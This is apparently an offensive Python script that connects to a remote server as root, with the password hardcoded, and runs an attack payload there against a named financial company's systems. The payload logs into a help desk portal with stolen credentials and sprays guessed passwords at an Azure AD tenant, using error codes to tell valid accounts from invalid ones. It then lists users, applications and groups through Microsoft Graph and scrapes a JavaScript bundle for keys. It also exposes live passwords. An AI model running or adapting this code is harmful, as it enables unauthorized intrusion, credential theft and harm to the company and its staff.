import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re, time
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


# ========================================
# 1. FOOTPRINTS — DEEP ANALYZE bmendezar:Pao1234+
# ========================================
sys.stdout.write("=" * 60 + "\n=== FOOTPRINTS bmendezar:Pao1234+ ANALYSIS ===\n" + "=" * 60 + "\n\n")

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

r = s.post("https://pao.findep.com.mx/MRcgi/MRlogin.pl",
    data={"USER": "bmendezar", "PASSWORD": "Pao1234+", "USERID": "bmendezar",
          "MRSubmit": "Submit", "PROJECTID": "1", "LASTSTEP": "1"},
    timeout=15, allow_redirects=True)

sys.stdout.write(f"Status: {r.status_code}\n")
sys.stdout.write(f"Size: {len(r.text)}b\n")
sys.stdout.write(f"URL: {r.url}\n")
sys.stdout.write(f"Cookies: {dict(s.cookies)}\n")
sys.stdout.write(f"Headers: {dict(r.headers)}\n\n")

# Check for session indicators
has_session = "SESSIONID" in str(dict(s.cookies)).upper() or "MR" in str(dict(s.cookies))
sys.stdout.write(f"Has session cookie: {has_session}\n\n")

# Full body analysis
body = r.text
sys.stdout.write(f"--- BODY (first 3000 chars) ---\n{body[:3000]}\n")
sys.stdout.write(f"\n--- BODY (last 1000 chars) ---\n{body[-1000:]}\n\n")

# Check for key indicators
for keyword in ["login", "password", "error", "welcome", "bienvenido", "dashboard",
                 "ticket", "service", "catalog", "submit", "issue", "request",
                 "menu", "logout", "cerrar", "sesion", "MRcgi", "forgot",
                 "incorrecto", "invalid", "denied", "access"]:
    count = body.lower().count(keyword.lower())
    if count > 0:
        sys.stdout.write(f"  '{keyword}': {count} occurrences\n")

# Try following a logged-in path
for path in ["/MRcgi/MRhomepage.pl", "/MRcgi/MRentrancePage.pl", 
             "/MRcgi/MRcreate.pl", "/MRcgi/MRticketList.pl",
             "/footprints/", "/MRcgi/"]:
    try:
        r2 = s.get(f"https://pao.findep.com.mx{path}", timeout=10)
        sys.stdout.write(f"\n  [{r2.status_code}] ({len(r2.text)}b) {path}\n")
        if r2.status_code == 200 and len(r2.text) > 100:
            # Check if it's the login page or a different page
            has_login_form = "MRlogin" in r2.text or "PASSWORD" in r2.text[:2000]
            sys.stdout.write(f"    Login form: {has_login_form}\n")
            if not has_login_form:
                sys.stdout.write(f"    Preview: {r2.text[:500]}\n")
    except:
        pass

# ALSO: Try baseline (wrong password)
sys.stdout.write("\n\n--- BASELINE (wrong pwd) ---\n")
s2 = requests.Session()
s2.verify = False
s2.headers.update({"User-Agent": UA})

r_base = s2.post("https://pao.findep.com.mx/MRcgi/MRlogin.pl",
    data={"USER": "bmendezar", "PASSWORD": "WRONGPASSWORD", "USERID": "bmendezar",
          "MRSubmit": "Submit", "PROJECTID": "1", "LASTSTEP": "1"},
    timeout=15, allow_redirects=True)

sys.stdout.write(f"Baseline size: {len(r_base.text)}b (Pao1234+ was {len(body)}b, diff={len(body)-len(r_base.text)})\n")
sys.stdout.write(f"Baseline cookies: {dict(s2.cookies)}\n\n")


# ========================================
# 2. AZURE AD DEV — hgarciaar (NOT YET TRIED)
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== AZURE AD DEV — hgarciaar@findep.dev ===\n" + "=" * 60 + "\n\n")

TENANT_DEV = "d37bcda5-7136-468e-a984-4a47aa1468aa"
TOKEN_URL = f"https://login.microsoftonline.com/{TENANT_DEV}/oauth2/v2.0/token"

hgarcia_creds = [
    ("hgarciaar@findep.dev", "Hgarcia1994*"),
    ("hgarciaar@findep.dev", "Quj577091"),
    ("hgarciaar@findep.dev", "Hgarcia2024*"),
    ("hgarciaar@findep.dev", "Hgarcia2025*"),
    ("hgarciaar@findep.dev", "Hgarcia2026*"),
    ("hgarciaar@findep.dev", "Hgarcia1994!"),
    ("hgarciaar@findep.dev", "HGarcia1994*"),
]

for email, pwd in hgarcia_creds:
    try:
        r = requests.post(TOKEN_URL,
            data={
                "grant_type": "password",
                "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
                "scope": "https://graph.microsoft.com/.default",
                "username": email,
                "password": pwd,
            },
            timeout=10)
        
        data = r.json()
        
        if "access_token" in data:
            sys.stdout.write(f"\n*** AZURE AD DEV LOGIN SUCCESS ***\n")
            sys.stdout.write(f"  {email} : {pwd}\n")
            sys.stdout.write(f"  Token: {data['access_token'][:100]}...\n")
            sys.stdout.write(f"  Refresh: {data.get('refresh_token', 'N/A')[:50]}...\n")
            
            token = data["access_token"]
            
            r_me = requests.get("https://graph.microsoft.com/v1.0/me",
                headers={"Authorization": f"Bearer {token}"}, timeout=10)
            if r_me.status_code == 200:
                me = r_me.json()
                sys.stdout.write(f"  Name: {me.get('displayName')}\n")
                sys.stdout.write(f"  Job: {me.get('jobTitle')}\n")
                sys.stdout.write(f"  UPN: {me.get('userPrincipalName')}\n")
                sys.stdout.write(f"  ID: {me.get('id')}\n\n")
            
            # List ALL users
            r_users = requests.get("https://graph.microsoft.com/v1.0/users?$top=999&$select=userPrincipalName,displayName,jobTitle,mail,accountEnabled",
                headers={"Authorization": f"Bearer {token}"}, timeout=10)
            if r_users.status_code == 200:
                users = r_users.json().get("value", [])
                sys.stdout.write(f"\n  ALL USERS ({len(users)}):\n")
                for u in users:
                    sys.stdout.write(f"    {u.get('userPrincipalName')} | {u.get('displayName')} | {u.get('jobTitle', '-')} | enabled={u.get('accountEnabled')}\n")
            
            # List applications (might reveal internal app IDs for Istio bypass!)
            r_apps = requests.get("https://graph.microsoft.com/v1.0/applications?$top=100",
                headers={"Authorization": f"Bearer {token}"}, timeout=10)
            if r_apps.status_code == 200:
                apps = r_apps.json().get("value", [])
                sys.stdout.write(f"\n  APPLICATIONS ({len(apps)}):\n")
                for a in apps:
                    creds = a.get("passwordCredentials", [])
                    sys.stdout.write(f"    {a.get('displayName')} | appId={a.get('appId')} | creds={len(creds)}\n")
            
            # Service principals
            r_sp = requests.get("https://graph.microsoft.com/v1.0/servicePrincipals?$top=100",
                headers={"Authorization": f"Bearer {token}"}, timeout=10)
            if r_sp.status_code == 200:
                sps = r_sp.json().get("value", [])
                sys.stdout.write(f"\n  SERVICE PRINCIPALS ({len(sps)}):\n")
                for sp in sps[:30]:
                    sys.stdout.write(f"    {sp.get('displayName')} | appId={sp.get('appId')}\n")
            
            # Groups
            r_groups = requests.get("https://graph.microsoft.com/v1.0/groups?$top=100",
                headers={"Authorization": f"Bearer {token}"}, timeout=10)
            if r_groups.status_code == 200:
                groups = r_groups.json().get("value", [])
                sys.stdout.write(f"\n  GROUPS ({len(groups)}):\n")
                for g in groups:
                    sys.stdout.write(f"    {g.get('displayName')} | {g.get('description', '-')[:50]}\n")
            
            break
        else:
            error = data.get("error_description", "")[:150]
            aadsts = re.search(r'AADSTS(\d+)', error)
            code = aadsts.group(0) if aadsts else "?"
            
            tag = ""
            if "50053" in str(code):
                tag = " *** LOCKED — STOP ***"
                sys.stdout.write(f"  [{code}] {email}:{pwd[:15]}...{tag}\n")
                break
            elif "50076" in str(code) or "50079" in str(code):
                tag = " *** MFA REQUIRED = CREDS VALID ***"
            elif "53003" in str(code):
                tag = " *** CA BLOCK = CREDS MAY BE VALID ***"
            elif "50055" in str(code):
                tag = " *** PASSWORD EXPIRED = VALID ***"
            elif "50034" in str(code):
                tag = " NOT_FOUND"
            elif "50126" in str(code):
                tag = " WRONG_PWD (user EXISTS)"
            
            sys.stdout.write(f"  [{code}] {email}:{pwd[:15]}...{tag}\n")
            
            if "VALID" in tag:
                sys.stdout.write(f"\n  !!! VALID CREDENTIALS: {email}:{pwd} !!!\n")
                
                # Try more client_ids
                for alt_cid, alt_name in [
                    ("04b07795-8ddb-461a-bbee-02f9e1bf7b46", "Azure CLI"),
                    ("d3590ed6-52b3-4102-aeff-aad2292ab01c", "Microsoft Office"),
                    ("1fec8e78-bce4-4aaf-ab1b-5451cc387264", "Teams"),
                ]:
                    r2 = requests.post(TOKEN_URL,
                        data={
                            "grant_type": "password",
                            "client_id": alt_cid,
                            "scope": "https://graph.microsoft.com/.default",
                            "username": email,
                            "password": pwd,
                        },
                        timeout=10)
                    d2 = r2.json()
                    if "access_token" in d2:
                        sys.stdout.write(f"  *** SUCCESS via {alt_name} ***\n")
                        sys.stdout.write(f"  Token: {d2['access_token'][:80]}...\n")
                        break
                    else:
                        e2 = re.search(r'AADSTS(\d+)', d2.get("error_description", ""))
                        sys.stdout.write(f"  {alt_name}: {e2.group(0) if e2 else '?'}\n")
                    time.sleep(0.5)
                break
    except Exception as e:
        sys.stdout.write(f"  ERR: {str(e)[:80]}\n")
    
    time.sleep(2)  # Careful cooldown
    sys.stdout.flush()


# ========================================
# 3. SIF — ANALYZE JS BUNDLE
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== SIF — JS BUNDLE ANALYSIS ===\n" + "=" * 60 + "\n\n")

try:
    r_js = requests.get("https://sif.findep.mx/assets/app.js?c8844ce2f160c06a45be",
        verify=False, timeout=15, headers={"User-Agent": UA})
    
    sys.stdout.write(f"JS bundle: [{r_js.status_code}] ({len(r_js.text)}b)\n\n")
    
    if r_js.status_code == 200:
        js = r_js.text
        
        # Extract API endpoints
        api_endpoints = re.findall(r'["\'](/api/[^\s"\'<>]+)["\']', js)
        sys.stdout.write(f"API endpoints ({len(set(api_endpoints))}):\n")
        for ep in sorted(set(api_endpoints)):
            sys.stdout.write(f"  {ep}\n")
        
        # Extract URLs
        urls = re.findall(r'https?://[^\s"\'<>]+findep[^\s"\'<>]*', js)
        sys.stdout.write(f"\nFindep URLs ({len(set(urls))}):\n")
        for u in sorted(set(urls)):
            sys.stdout.write(f"  {u}\n")
        
        # Extract any credentials/keys
        for pattern in [
            r'["\'](?:apikey|api_key|key|token|secret|password|Authorization)["\']:\s*["\']([^"\']+)',
            r'Bearer\s+([A-Za-z0-9._-]{20,})',
            r'(?:client_id|clientId)\s*[=:]\s*["\']([^"\']+)',
        ]:
            matches = re.findall(pattern, js, re.I)
            if matches:
                sys.stdout.write(f"\nPattern '{pattern[:40]}...': {matches[:5]}\n")
        
        # Extract login-related code
        login_chunks = []
        for m in re.finditer(r'login|signin|authenticate|auth', js, re.I):
            start = max(0, m.start() - 100)
            end = min(len(js), m.end() + 200)
            chunk = js[start:end]
            if chunk not in login_chunks:
                login_chunks.append(chunk)
        
        sys.stdout.write(f"\nLogin-related code chunks ({len(login_chunks)}):\n")
        for i, chunk in enumerate(login_chunks[:10]):
            sys.stdout.write(f"  [{i}] ...{chunk}...\n\n")
except Exception as e:
    sys.stdout.write(f"SIF JS ERR: {str(e)[:80]}\n")


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/fp_follow_up.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/fp_follow_up.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
